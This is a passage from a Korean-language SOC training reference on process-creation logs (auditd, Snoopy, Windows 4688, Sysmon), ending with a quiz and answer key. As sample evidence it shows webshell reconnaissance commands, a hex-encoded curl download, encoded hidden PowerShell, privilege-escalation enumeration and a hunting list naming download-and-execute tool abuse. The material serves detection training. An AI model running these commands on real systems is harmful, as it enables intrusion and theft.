- `ppid=54636 pid=54831` — 부모 프로세스 ID와 새 프로세스 ID. `pid=54636`을 찾으면 부모(보통 사용자의 셸)가 나옵니다.
- `auid=1000` — **감사 사용자 ID(audit user ID)**, *로그인 UID*라고도 합니다. 사용자가 로그인할 때 정해지고, `sudo`나 `su`를 써도 **바뀌지 않습니다.** Linux 포렌식에서 가장 값진 칸 중 하나입니다. `uid=0`(root)인데 `auid=1000`이면, 사용자 1000으로 로그인한 사람이 root가 됐다는 뜻입니다. `auid=4294967295`(`unset`으로 표시)이면, 로그인한 적 없는 무언가 — 데몬, 웹 서버, cron — 가 띄운 프로세스입니다. `whoami` 같은 대화형 도구라면 아주 수상합니다.
- `uid gid euid suid fsuid egid sgid fsgid` — 실제(real), 유효(effective), 저장(saved), 파일 시스템용 사용자/그룹 ID. 보통 다 같습니다. 다르면(예: `uid=1000 euid=0`) setuid 프로그램이 권한을 올렸다는 뜻입니다.
- `tty=pts0` — 가상 터미널, 즉 SSH 같은 대화형 세션입니다. `(none)`이면 터미널이 없습니다(데몬, cron, 웹셸).
- `ses=2` — 로그인 세션 번호. 한 로그인 안의 모든 명령을 묶어 줍니다.
- `comm="whoami"` — 짧은 명령 이름(앞 15글자). `exe="/usr/bin/whoami"` — 실행 파일 전체 경로.
- `key="proc_create"` — 우리 규칙의 이름표.

**EXECVE 줄 — 명령줄:** `argc=1`(프로그램 이름을 포함한 인자 개수 1개)과 `a0="whoami"`. `ls -la /tmp` 같은 명령이면 `argc=3 a0="ls" a1="-la" a2="/tmp"`가 됩니다.

**CWD 줄:** `cwd="/var/log"` — 작업 폴더. Sysmon의 `CurrentDirectory`와 같습니다.

**PATH 줄 — 관련된 파일들:** `item=0`은 프로그램 자신이고 inode, 장치, 권한(`mode=0100755` = 일반 파일, `rwxr-xr-x`), 소유자(`ouid=0` = root)가 나옵니다. `item=1`은 동적 로더 `ld-linux-x86-64.so.2`입니다. 커널은 동적으로 링크된 프로그램을 시작할 때 늘 이걸 불러옵니다. `cap_*` 칸은 파일 권한(capability)을 보여 줍니다(여기선 없음).

**PROCTITLE 줄:** 프로세스가 보는 전체 명령줄. 여기서는 짧고 단순하지만, 띄어쓰기가 들어가면 16진수로 인코딩됩니다(다음 절).

### 16진수로 인코딩된 인자 { #auditd-hex }

auditd는 값에 띄어쓰기, 따옴표, 제어 문자가 없을 때만 따옴표로 감싸 씁니다. 그렇지 않으면 **따옴표 없이 16진수로** 씁니다. `web-01`의 웹셸이 웹 서버 사용자로 `bash -c "id; uname -a"`를 실행하면 이런 줄들이 나옵니다.

```text
type=SYSCALL msg=audit(1795141205.104:9120): arch=c000003e syscall=59 success=yes exit=0 ... ppid=2211 pid=30417 auid=4294967295 uid=33 gid=33 euid=33 ... tty=(none) ses=4294967295 comm="bash" exe="/usr/bin/bash" key="proc_create"
type=EXECVE msg=audit(1795141205.104:9120): argc=3 a0="bash" a1="-c" a2=69643B20756E616D65202D61
type=PROCTITLE msg=audit(1795141205.104:9120): proctitle=62617368002D630069643B20756E616D65202D61
```

- `a2=69643B20756E616D65202D61` — 따옴표가 없으니 16진수입니다. 풀면 `id; uname -a`.
- `proctitle=62617368002D63...` — 전체 명령줄의 16진수인데, **인자 사이에 널 바이트(`00`)** 가 들어 있습니다. `bash`, `-c`, `id; uname -a`.
- `auid=4294967295`, `ses=4294967295`, `tty=(none)`, `uid=33` — 로그인한 사람 없음, 터미널 없음, `www-data`로 실행. 웹 서버 프로세스가 `bash`를 띄워 정보 탐색 명령(T1033, T1082)을 돌리는 것, 이게 웹셸의 전형적인 흔적입니다(T1505.003).

명령줄에서 `echo 69643B20756E616D65202D61 | xxd -r -p`로 풀 수 있고(`id; uname -a`가 나옴), 그냥 `ausearch -i`에 맡겨도 됩니다.

**[주의]** SIEM에서 `audit.log`를 대상으로 `uname`이라는 글자를 검색하면 이 이벤트를 **놓칩니다.** 그 단어는 16진수 안에만 있으니까요. 탐지를 쓰기 전에 수집 단계에서 풀어 주세요(또는 풀어 주는 도구를 쓰세요).

### 찾고 요약하기: ausearch와 aureport { #ausearch }

```bash
sudo ausearch -k proc_create -ts today -i
```

- `ausearch` — 감사 로그를 검색하고, 이벤트마다 줄들을 묶어 보여 줍니다.
- `-k proc_create` — 이 키를 가진 규칙이 만든 이벤트만.
- `-ts today` — 시작 시각(time start): 오늘 자정부터(`-ts recent` = 최근 10분. 날짜와 시각을 직접 줄 수도 있음).
- `-i` — **해석(interpret)**: 숫자를 이름으로 바꿉니다(syscall 59 → `execve`, uid 1000 → `dev.lee`, 16진수 → 글자, 에포크 → 현지 시각).

출력(이벤트 하나, `----`로 구분)입니다.

```text
----
type=PROCTITLE msg=audit(20/11/26 13:14:07.866:8332) : proctitle=whoami
type=PATH msg=audit(20/11/26 13:14:07.866:8332) : item=0 name=/usr/bin/whoami inode=1049945 dev=08:01 mode=file,755 ouid=root ogid=root ...
type=CWD msg=audit(20/11/26 13:14:07.866:8332) : cwd=/var/log
type=EXECVE msg=audit(20/11/26 13:14:07.866:8332) : argc=1 a0=whoami
type=SYSCALL msg=audit(20/11/26 13:14:07.866:8332) : arch=x86_64 syscall=execve success=yes exit=0 ... ppid=54636 pid=54831 auid=dev.lee uid=dev.lee ... tty=pts0 ses=2 comm=whoami exe=/usr/bin/whoami key=proc_create
```

다른 쓸모 있는 검색: `ausearch -ua 1000 -i`(무엇이 됐든 로그인 사용자 1000이 한 모든 일), `ausearch -x /usr/bin/curl -i`(`curl`이 실행된 모든 기록), `ausearch -p 54636 -i`(부모). 전체 그림은 `aureport -x --summary`가 프로그램별 실행 횟수를 세어 주고, `aureport -au`가 인증 시도를 보여 줍니다.

```text
Executable Summary Report
=================================
total  file
=================================
4127  /usr/bin/bash
2210  /usr/bin/ls
  43  /usr/bin/curl
   1  /tmp/.cache/kworker
```

`/tmp`에서 커널 스레드 이름을 흉내 낸 프로그램이 딱 한 번 돌았다면(T1036.004, Masquerade Task or Service) 바로 눈에 띕니다.

### 실무에서의 auditd { #auditd-practice }

auditd는 지나칠 정도로 꼼꼼합니다. 바쁜 서버는 하루에 수백만 개의 `execve` 기록을 만들 수 있고, 여러 줄 형식은 SIEM이 다루기 불편합니다. 실무 요령입니다.

- 모든 걸 직접 쓰기보다, 널리 알려진 커뮤니티 규칙 모음(공개적으로 관리되는 것이 여럿 있고, 기준선으로 많이 쓰는 "best practice" 감사 규칙이 좋은 출발점)에서 시작해 다듬으세요.
- 알려진, 시끄럽고 무해한 자동화는 필터(예: `exe`나 `auid` 기준)로 빼고, 모든 규칙에 뜻이 분명한 키를 붙이세요.
- 줄을 **이어 붙이고 풀어 주는** 수집기로 보내세요. Auditbeat/Elastic Agent, Splunk의 Linux 애드온, 또는 이벤트 하나를 JSON 한 줄로 바꿔 주는 LAUREL 같은 플러그인.
- 감사 시스템 자체를 지키세요. `auditctl -D`(모든 규칙 삭제), `systemctl stop auditd`, `/etc/audit/` 아래 파일 수정을 지켜보세요(T1562.012, Disable or Modify Linux Audit System). 마지막 규칙으로 `-e 2`를 넣으면 재부팅 전까지 설정이 **바뀌지 않게(immutable)** 됩니다.

## Snoopy로 보는 Linux 프로세스 생성 { #snoopy }

### Snoopy가 뭔가 { #snoopy-what }

**Snoopy**는 시스템에서 실행되는 모든 명령을 기록하는 작은 라이브러리입니다. 설치는 패키지 하나면 됩니다(Debian/Ubuntu에서 `sudo apt install snoopy`). 패키지가 라이브러리를 **`/etc/ld.so.preload`** 에 넣어 두면, 동적 로더가 새로 시작되는 모든 동적 링크 프로그램에 이걸 함께 불러옵니다. 프로그램이 `execve`를 부를 때마다 Snoopy는 authpriv 기능(facility)으로 syslog에 한 줄을 씁니다. Ubuntu에서는 **`/var/log/auth.log`**, Red Hat 계열에서는 `/var/log/secure`로 갑니다. 로그인 모니터링 때문에 이미 수집하고 있을 가능성이 큰 곳이죠([Linux 로그 파일과 저널](../linux-logging/log-files-journal.md) 참고).

auditd가 법정 속기사라면, Snoopy는 화면에 시각이 찍히는 가게 CCTV입니다. 덜 자세하지만, 누구든 한눈에 알아볼 수 있습니다.

### Snoopy 한 줄, 칸 하나씩 { #snoopy-line }

메시지 형식은 `/etc/snoopy.ini`(`message_format`)에서 바꿀 수 있습니다. 로그인과 SSH 정보가 들어가는 형식이면, `app-02`의 세션은 이렇게 보입니다.

```text
Nov 20 13:05:33 app-02 snoopy[4550]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp]: git clone https://git.example/tools/sys-enum.git
Nov 20 13:05:41 app-02 snoopy[4562]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: bash ./sys-enum.sh
Nov 20 13:05:41 app-02 snoopy[4570]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: find / -perm -4000 -type f
Nov 20 13:05:42 app-02 snoopy[4571]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: cat /etc/sudoers
```

- `Nov 20 13:05:33 app-02` — 평소의 syslog 시각과 호스트 이름.
- `snoopy[4550]` — 프로그램 태그. 숫자는 시작된 프로세스의 PID입니다.
- `login:dev.lee` — **로그인한** 사용자(auditd의 `auid`와 같은 역할).
- `ssh:(203.0.113.45 53123 10.0.0.12 22)` — `SSH_CONNECTION` 변수에서 가져온 값. 클라이언트 IP, 클라이언트 포트, 서버 IP, 서버 포트. 즉 이 세션은 외부 주소에서 왔습니다.
- `sid:3907` — 세션 ID. 한 로그인에서 나온 명령을 묶어 줍니다.
- `tty:/dev/pts/1 (1000/dev.lee)` — 터미널과 그 주인.
- `uid:dev.lee(1000)/dev.lee(1000)` — 실제 사용자와 유효 사용자. `sudo` 뒤라면 `root(0)`이 나옵니다.
- `cwd:/tmp` — 작업 폴더.
- 콜론 뒤 — **전체 명령줄**: `git clone https://git.example/tools/sys-enum.git`.

네 줄을 이야기로 읽으면 이렇습니다. 바깥에서 접속한 사용자가 `/tmp`에 저장소를 복제하고, 그 안의 스크립트를 돌렸고, 그 스크립트가 setuid 프로그램을 찾고 sudoers 파일을 읽기 시작했습니다. 공개된 **권한 상승 정보 수집 스크립트**가 일하는 모습입니다(정보 탐색 T1082 / T1083, 권한 상승 TA0004 준비 — [권한 상승](../endpoint-attacks/privilege-escalation.md) 참고). 스크립트가 띄운 자식 명령까지 모두 기록되니, 정보 수집 전체가 한 줄씩 드러납니다. 누군가 보고만 있다면 아주 쉽게 잡힙니다.

### Snoopy의 한계 { #snoopy-limits }

Snoopy를 만든 사람들도 이게 피할 수 없는 보안 도구는 아니라고 말합니다. 동적 로더에 기대기 때문입니다.

- **정적으로 링크된 프로그램**은 로더를 쓰지 않으니, Snoopy가 그 안에 아예 들어가지 않고, 그 프로그램이 띄운 자식 프로세스도 기록되지 않습니다.
- 프로그램이 시스템 콜을 직접 부를 수도 있고, root를 가진 공격자는 **`/etc/ld.so.preload`에서 그 줄을 지우거나** 라이브러리를 삭제할 수 있습니다(FIM이나 auditd로 그 파일을 지켜보세요. preload 파일은 공격자 자신도 악용합니다. T1574.006 Dynamic Linker Hijacking).
- 기록이 syslog를 거치니, root 공격자는 로컬 로깅을 멈추거나 고칠 수 있습니다. 빨리 호스트 밖으로 보내세요.
- 인자에 비밀이 들어간 명령(`mysql -p<password>`)은 평문으로 기록됩니다. 로그 접근을 제한하세요.

**완벽한 해결책의 오류(perfect-solution fallacy)** 를 기억하세요. 우회할 수 있는 통제라도, 굳이 우회하지 않는 많은 공격자를 잡는다면 여전히 값어치가 있습니다. Snoopy는 싸고 읽기 쉽습니다. 중요한 서버에는 auditd나 EDR/eBPF 센서와 함께 쓰세요.

## Windows와 Linux 나란히 보기 { #comparison }

| | Windows 4688 | Sysmon 이벤트 1 | auditd `execve` | Snoopy |
| --- | --- | --- | --- | --- |
| 위치 | Security 채널 | Sysmon/Operational 채널 | `/var/log/audit/audit.log` | syslog → `auth.log`/`secure` |
| 명령줄 | 별도 정책 필요 | 있음 | 있음(EXECVE/PROCTITLE, 가끔 16진수) | 있음, 한 줄 |
| 부모 | 이름 + PID | 경로, PID, GUID, 명령줄 | `ppid`만 | 없음(세션 정보만) |
| 실제 로그인 사용자 | `SubjectLogonId` → 4624 | `LogonId` | `auid` | `login:` |
| 해시 | 없음 | 있음 | 없음 | 없음 |
| 형식 | 이벤트 하나 | 이벤트 하나 | 이벤트당 여러 줄 | 한 줄 |
| 우회 | 로그 삭제, 정책 변경 | 드라이버 내리기, 설정 조작 | 규칙 삭제, auditd 중지 | 정적 바이너리, preload 제거 |

## SOC에서 써먹기 { #soc-use }

- **켜고, 켜졌는지 증명하세요.** Windows: 모든 시스템에서 *Audit Process Creation* = 성공 **그리고** 명령줄 정책. 표본 호스트의 4688에 `CommandLine`이 비어 있지 않은지 확인합니다. Linux: `b64`와 `b32` 둘 다의 `execve` 규칙(또는 Snoopy/EDR)을 `auditctl -l`과 시험 명령으로 확인합니다.
- **공통 칸으로 정규화하세요:** `host`, `user`, `process_path`, `process_name`, `command_line`, `process_id`, `parent_path`, `parent_command_line`, `parent_id`, `hash_sha256`, `logon_id`/`auid`. auditd의 16진수는 수집 단계에서 풉니다.
- **헌팅·경보 대상:** Office, PDF 리더, 브라우저, 웹 서버가 셸이나 스크립트 호스트를 띄움; 인코딩되거나 숨긴 PowerShell(`-enc`, `-w hidden`); 내려받기나 대리 실행 인자를 받은 서명된 프로그램(`certutil -urlcache`, `mshta http`, 이상한 경로의 `rundll32`, `regsvr32 /i:http`); `Temp`, `Downloads`, `Public`, `ProgramData`나 `/tmp`, `/dev/shm`에서 실행되는 프로그램; 이름을 바꾼 시스템 도구(`OriginalFileName` ≠ 파일 이름); `vssadmin`/`wbadmin`/`bcdedit`로 복구 기능 망가뜨리기; 짧은 시간 안에 몰린 정보 탐색 명령(`whoami`, `net group`, `nltest`, `id`, `uname -a`, `find / -perm -4000`); `auid`가 비어 있고 `tty=(none)`인데 대화형 도구를 돌림; 전체 컴퓨터에서 처음 보거나 드문 해시.
- **앞뒤로 사슬을 따라가세요.** 수상한 프로세스에서 부모 사슬을 거슬러 근본 원인(이메일 첨부, 웹 요청, 로그인)까지 가고, 자식을 따라가 그다음 무슨 일이 있었는지 봅니다. 네트워크·파일 이벤트와는 `ProcessGuid`나 PID + 호스트 + 시각으로 이어 붙입니다.
- **가시성이 아니라 양을 관리하세요.** 프로세스 로그는 큽니다. 알려진 정상의 대량 자동화는 쿼리에서, 또는 좁고 검토된 제외 규칙으로 조심스럽게 거르세요. `powershell.exe`나 `bash` 같은 프로그램을 통째로 수집에서 빼면 절대 안 됩니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    프로세스 생성은 여전히 어느 SOC에서든 가장 값진 로그 중 하나이고, 중요한 칸 — 경로, 명령줄, 부모, 사용자, 해시 — 도 그대로입니다. 이벤트 4688과 그 칸들, 별도의 명령줄 정책, Sysmon 이벤트 1, auditd `execve` 규칙과 `audit.log` 기록 형식, `auid`, `ausearch`/`aureport`, Snoopy의 한 줄 형식은 모두 설명한 대로 동작합니다. "부모 → 자식 → 명령줄"은 지금도 분석가가 EDR 프로세스 트리를 읽는 방식입니다.

!!! info "[변경됨] 바뀐 점"
    - **Sysmon이 Windows의 일부가 되고 있습니다.** Microsoft는 2025년 말에 Sysmon 기능을 Windows에 내장하겠다고 발표했고, 2026년에 Windows 11에 **기본으로 꺼져 있는 선택적 기능**으로 배포했습니다. *선택적 기능(Optional features)* 에서 추가한 뒤, 독립 실행형 도구와 비슷하게 설정 파일로 켭니다. 이벤트는 여전히 `Microsoft-Windows-Sysmon/Operational`로 갑니다. Windows Server 지원도 함께 발표됐습니다. 우리 컴퓨터들의 정확한 빌드 요구 조건을 확인하고, 독립 실행형 Sysmon과 내장 Sysmon을 동시에 돌리지 마세요.
    - **이제 대부분의 조직에서 EDR이 주된 프로세스 출처입니다.** Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Elastic Defend 같은 제품은 기본으로 해시와 서명자가 담긴 프로세스 트리를 기록하고, 많은 SIEM이 그 기록을 바로 받아들입니다. 4688/Sysmon은 독립된 두 번째 출처로서, 그리고 EDR이 없는 곳에서 여전히 값어치가 있습니다.
    - **eBPF 기반 Linux 센서**(Sysmon for Linux, Falco, Tetragon, 대부분의 Linux EDR)가 많은 서버와 컨테이너에서 손으로 다듬던 auditd를 대신하고 있습니다. 이벤트 하나짜리 구조화된 출력, 더 적은 부하, 그리고 auditd에 없는 컨테이너 인식.
    - **공통 스키마**(Elastic Common Schema, OCSF, Microsoft ASIM)가 표준 프로세스 칸을 정해 두어서, 한 번 쓴 탐지 규칙(예: Sigma 규칙)을 4688, Sysmon, EDR, Linux 데이터에 똑같이 돌릴 수 있습니다.
    - **공격자도 AI를 씁니다.** 명령줄과 난독화를 빠르게 바꾸니, 정확한 문자열에 기대는 탐지는 더 빨리 낡습니다. 그래서 부모-자식 관계와 행위 기반 논리가 더 중요해졌습니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **4688에 명령줄이 있다고 가정하지 마세요.** 별도 정책이 없으면 비어 있고, 아직도 꺼 둔 환경이 많습니다.
    - **4688의 `ProcessId`를 새 프로세스로 읽지 마세요.** 그건 부모이고, 새 프로세스는 `NewProcessId`입니다.
    - **Sysmon 이벤트 1에서 서명을 기대하지 마세요.** 그리고 `Company`/`Description`을 증거로 믿지 마세요. 파일을 만든 사람이 써 넣은 값입니다.
    - **Linux에서 `arch=b64` execve만 수집하지 마세요.** `b32`를 더하고 `execveat`도 고려하세요.
    - **16진수를 풀지 않은 채 날것 `audit.log`에서 단어를 검색하지 마세요.** 공격자가 치는, 띄어쓰기와 따옴표가 들어간 바로 그 명령들을 놓칩니다.
    - **Snoopy를 조작 불가능하다고 여기지 마세요.** 호스트 밖으로 빨리 보내고, `/etc/ld.so.preload`에 FIM을 거세요.
    - **양을 줄이려고 PowerShell, cmd, bash를 빼지 마세요.** 공격자가 가장 많이 쓰는 게 바로 그것들입니다.

## 확인 문제 { #quiz }

### 문제 1

워크스테이션에서 `NewProcessName` = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `CommandLine` = `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...`, `ParentProcessName` = `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`, `TokenElevationType` = `%%1938`, `ProcessId` = `0x2210`인 4688을 찾았습니다. 각 칸이 무엇을 말해 주는지, 어떤 가설을 세우는지, 다음에 무엇을 볼지 말하세요.

??? success "정답과 해설"
    - `NewProcessName` — 정상 경로에 있는 진짜 Windows PowerShell입니다. 프로그램 자체는 정상입니다.
    - `CommandLine` — `-nop`(프로필 안 읽음), `-w hidden`(창 숨김), `-enc`(Base64로 인코딩된 명령, UTF-16LE)가 함께 있으면 사용자 몰래 스크립트를 돌리는 전형적인 방식입니다. 보이는 Base64 앞부분을 풀면 `IEX (New-Obj...`로 시작합니다. "내려받아서 메모리에서 실행"입니다(T1059.001).
    - `ParentProcessName` — **Excel이 PowerShell을 띄웠습니다.** 스프레드시트는 원래 이런 일을 하지 않습니다. 매크로나 숨은 익스플로잇이 든 악성 문서를 가리킵니다(T1204.002, 흔히 T1566.001 피싱 뒤).
    - `TokenElevationType` `%%1938` — 제한된(권한을 올리지 않은) 토큰. 공격자는 아직 관리자가 아니라 사용자로 돌고 있습니다.
    - `ProcessId` `0x2210` — **부모**(Excel)의 PID. Excel이 띄운 다른 자식을 찾을 때 씁니다.

    **가설:** 사용자가 악성 스프레드시트를 열었고, 그게 숨겨진 인코딩 PowerShell 내려받기 명령을 실행했습니다. **다음:** Base64 전체를 풉니다([Base64](../http-analysis/base64.md) 참고). 이 PowerShell의 자식 프로세스(`ProcessId`가 이 이벤트의 `NewProcessId`와 같은 4688)와 네트워크 연결(Sysmon 3, 방화벽, 프록시, DNS)을 찾습니다. 풀린 스크립트를 담은 PowerShell 스크립트 블록 로그(4104), 파일을 전달한 이메일을 확인합니다. 그다음 호스트를 격리하고 같은 이메일을 받은 다른 사람을 확인합니다.

### 문제 2

Linux 웹 서버에서 이 auditd 이벤트를 찾았습니다. 중요한 칸을 설명하고, 무슨 일이 있었을지 말하세요.

```text
type=SYSCALL msg=audit(1795142011.552:10442): arch=c000003e syscall=59 success=yes exit=0 ... ppid=2211 pid=31877 auid=4294967295 uid=33 gid=33 euid=33 ... tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" key="proc_create"
type=EXECVE msg=audit(1795142011.552:10442): argc=3 a0="sh" a1="-c" a2=6375726C202D73206874...
type=CWD msg=audit(1795142011.552:10442): cwd="/var/www/html/uploads"
```

??? success "정답과 해설"
    - `msg=audit(...:10442)` — 세 줄 모두 한 이벤트입니다(시각과 일련번호가 같음).
    - `syscall=59 success=yes` — 성공한 `execve`. 프로그램이 시작됐습니다.
    - `auid=4294967295`와 `ses=4294967295` — 뒤에 **로그인한 사람이 없습니다.** `tty=(none)` — 터미널 없음. `uid=33`/`euid=33` — 웹 서버 계정(Debian/Ubuntu에서 `www-data`)으로 실행.
    - `ppid=2211` — 부모. 찾아보면 아마 웹 서버나 PHP 작업 프로세스가 나올 겁니다.
    - `comm="sh" exe="/usr/bin/dash"` — 셸(Debian/Ubuntu에서 `sh`는 `dash`를 가리키는 링크).
    - `a2=6375726C...` — 따옴표가 없으니 **16진수**입니다. `63 75 72 6C 20 2D 73 20 68 74`를 풀면 `curl -s ht...`, 내려받기입니다.
    - `cwd="/var/www/html/uploads"` — 셸이 웹 업로드 폴더에서 시작됐습니다.

    **무슨 일:** 웹 애플리케이션에 올라간 파일(아마 웹셸, T1505.003)이 웹 서버에게 셸을 띄우게 했고, 그 셸이 `curl`로 무언가를 내려받습니다(T1105). **다음:** `a2` 전체를 풀고, `/var/www/html/uploads`에서 올라간 스크립트와 그 초의 웹 접근 로그 요청을 찾고, `ppid=31877`이거나 `auid`가 비어 있고 `uid=33`인 `execve` 이벤트가 더 있는지 보고, 풀린 URL로 나간 연결을 찾습니다.

### 문제 3

동료가 말합니다. "Linux 서버 전부에 Snoopy를 깔았으니 auditd는 꺼도 돼요. Snoopy가 명령을 다 기록하고 훨씬 읽기 쉽거든요." 맞는 말인가요? 기술적인 이유 두 가지와 권고를 말하세요.

??? success "정답과 해설"
    딱 맞지는 않습니다. Snoopy는 읽기 쉬운 좋은 *추가* 출처지만, 중요한 서버에서 유일한 출처가 되어서는 안 됩니다.

    - **우회할 수 있습니다.** Snoopy는 동적 로더가 `/etc/ld.so.preload`를 통해 끼워 넣습니다. 정적으로 링크된 프로그램은 이걸 아예 불러오지 않으니 그 프로그램이 띄운 명령은 기록되지 않고, root 공격자는 preload 항목이나 라이브러리를 지울 수 있습니다.
    - **기록하는 게 적습니다.** Snoopy는 명령을 기록합니다. auditd는 파일 접근(예: `/etc/shadow` 읽기), 계정·권한 변경, 실패한 실행까지 지켜볼 수 있고, `auid`, `ppid`, 경로를 구조화된 형태로 남깁니다. Snoopy는 부모 프로세스를 아예 기록하지 않습니다.
    - **기록이 syslog에 있어서**, 빨리 밖으로 보내지 않으면 로컬 root 공격자가 멈추거나 고칠 수 있습니다.

    **권고:** 분석가에게 도움이 된다면 Snoopy는 두세요(그 줄들은 경보 걸기 쉽습니다). 하지만 중요한 서버에는 auditd(`b64`와 `b32` `execve` 규칙, 그리고 민감한 파일·`/etc/ld.so.preload`·`/etc/audit/`에 대한 파일 감시)나 EDR/eBPF 센서를 유지하고, 모든 걸 호스트 밖으로 보내고, auditd가 멈추거나 규칙이 지워지면 경보를 울리세요. 완벽하지 않다고 쓸모없는 건 아니지만, 출처 하나보다는 여러 겹이 낫습니다.

## 관련 레퍼런스 { #related }

- [꼭 알아야 할 이벤트](index.md) — 이 섹션 개요
- [로그인 이벤트](logins.md) — 프로세스의 로그온 ID / `auid`가 가리키는 로그온
- [Windows 이벤트 구조와 채널](../windows-logging/event-structure-channels.md) — 이벤트 XML 읽기와 Sysmon 채널
- [Linux 로그 파일과 systemd 저널](../linux-logging/log-files-journal.md) — `auth.log`와 `audit.log`가 있는 곳
- [실행, 지속성, 정보 탐색](../endpoint-attacks/execution-persistence-discovery.md) — 이 로그들이 기록하는 공격자 행동
- [애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md) — "무엇이 실행돼도 되나"의 예방 쪽
- [PAW, EDR, DLP, UEBA](../endpoint-defense/paw-edr-dlp-ueba.md) — EDR 프로세스 기록
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md)
- [Prefetch](../../../windows/prefetch.md) — 프로세스 로그가 없을 때의 실행 증거
- [Linux 로그와 초동 분석](../../../linux/logs-and-triage.md)
